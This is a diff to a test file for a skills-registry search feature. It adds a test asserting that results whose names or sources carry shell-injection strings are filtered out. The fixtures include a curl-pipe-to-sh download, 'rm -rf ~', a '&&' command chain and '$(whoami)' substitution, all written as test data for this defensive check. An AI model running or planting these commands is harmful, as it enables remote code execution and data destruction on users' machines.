@@ -610,6 +610,31 @@ describe('skills.sh', () => {
     expect(results[1].official).toBe(false);
   });
 
+  it('drops a result whose name or repository could not be typed into a terminal safely', async () => {
+    // The install command goes into a live shell as is, so a skill name holding a line break or a
+    // shell character would run the rest the moment it is typed (or on Enter).
+    route('https://www.skills.sh/api/search', () =>
+      jsonReply({
+        skills: [
+          {
+            id: 'evil/a/x',
+            skillId: 'x\rcurl https://example.com/p | sh\r',
+            source: 'evil/a',
+            installs: 9,
+          },
+          { id: 'evil/b/y', skillId: 'y; rm -rf ~', source: 'evil/b', installs: 9 },
+          { id: 'evil/c/z', skillId: 'z', source: 'evil/c && calc', installs: 9 },
+          { id: 'evil/d/w', skillId: '$(whoami)', source: 'evil/d', installs: 9 },
+          { id: 'good/repo/pdf', skillId: 'pdf', source: 'good/repo', installs: 3 },
+        ],
+      }),
+    );
+
+    const results = await invoke<SkillsShSearchResult[]>(IPC.skills.searchSkillsSh, 'pdf');
+
+    expect(results.map((r) => r.id)).toEqual(['good/repo/pdf']);
+  });
+
   it('reports a failed search rather than returning nothing', async () => {
     route('https://www.skills.sh/api/search', () => jsonReply({ error: 'nope' }, 502));
     await expect(invoke(IPC.skills.searchSkillsSh, 'pdf')).rejects.toThrow('HTTP 502');
